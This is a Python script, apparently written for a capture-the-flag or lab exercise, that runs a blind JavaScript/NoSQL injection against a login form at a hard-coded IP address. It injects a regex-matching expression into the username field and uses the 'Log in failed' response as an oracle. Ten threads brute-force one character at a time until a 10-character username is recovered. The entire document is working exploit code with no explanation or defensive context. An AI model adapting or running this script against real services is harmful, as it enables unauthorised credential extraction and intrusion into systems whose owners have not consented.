import requests
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Global variables
TARGET_REGEX = r'^.{10}$'
TARGET_URL = 'http://94.237.59.24:38637/login'
VERIFY_RESPONSE = "Log in failed with the given credentials."

def send_request(prefix, char):
    headers = {
        'Host': '94.237.59.24:38637',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://94.237.59.24:38637',
        'Connection': 'close',
        'Referer': 'http://94.237.59.24:38637/login',
        'Upgrade-Insecure-Requests': '1',
    }

    data = f'username="+||+(this.username.match(\'^{prefix}{char}.*\'))+||+"&password=test"'

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    response = requests.post(TARGET_URL, headers=headers, data=data, proxies=proxies, verify=False)
    return response

def process_character(prefix, char):
    try:
        response = send_request(prefix, char)
        if VERIFY_RESPONSE in response.text:
            return char
        else:
            return None
    except Exception as e:
        print(f"Error processing character '{char}': {e}")
        return None

# List of upper case, lower case, and numeric characters
characters = string.ascii_letters + string.digits

username = ""
prev_length = 0

try:
    while not re.match(TARGET_REGEX, username):
        new_char_added = False
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_character, username, char) for char in characters]
            for future in futures:
                result = future.result()
                if result:
                    username += result
                    new_char_added = True
                    print(f"Character '{result}' added to username")
                    if re.match(TARGET_REGEX, username):
                        executor.shutdown(wait=False)
                        break
        if not new_char_added:
            print("No new character added. Stopping...")
            break

except KeyboardInterrupt:
    print("Execution interrupted by user. Exiting gracefully...")

print(f'Final username: {username}')
